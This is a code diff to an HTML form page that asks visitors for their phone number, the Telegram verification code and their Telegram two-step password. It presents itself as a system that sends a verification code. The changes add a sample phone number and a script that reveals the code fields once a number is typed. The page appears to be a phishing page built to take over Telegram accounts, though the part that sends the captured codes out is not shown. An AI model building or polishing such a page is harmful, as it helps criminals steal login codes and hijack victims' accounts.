@@ -30,6 +30,9 @@ font-weight: 600;
 label{
 font-size: 14px;
 }
+input::placeholder{
+font-weight: 600;
+}
 
 input{
 border: 1px solid #000;
@@ -90,6 +93,10 @@ font-family: var(--font);
 padding: 8px 40px;
 margin-top: 10px;
 }
+
+.received{
+display: none;
+}
 </style>
 <body>
 <div class="container_server_telegra">
@@ -100,15 +107,28 @@ margin-top: 10px;
 </div>
 <div class="inputs">
 <label for="number"> Your number</label><br>
-<input type="text" id="number"/>
+<input type="text" id="number" placeholder="+19048653345" required/>
 <p style="font-size: 14px; opacity: 0.6;">enter your number here, we need your number for our system to send the verification code</p>
+<div class="received">
 <label for="code_telegram">Telegram code</label><br>
 <input type="text" id="code_telegram"><br>
 <p style="font-size: 13px; opacity: 0.6;">Telegram sends a verification code, use that code here.</p>
 <label for="code">Two step code (if you have)</label><br>
 <input type="text" id="code">
+</div>
 <br>
 <button type="submit" class="next">Next</button>
+<script>
+const received = document.querySelector('.received');
+document.querySelector('.next').addEventListener('click', () => {
+const number = document.getElementById('number').value
+if(number.length >= 4){
+received.style.display = "inline";
+} else {
+received.style.display = "none";
+}
+})
+</script>
 </div>
 </div>
 </body>
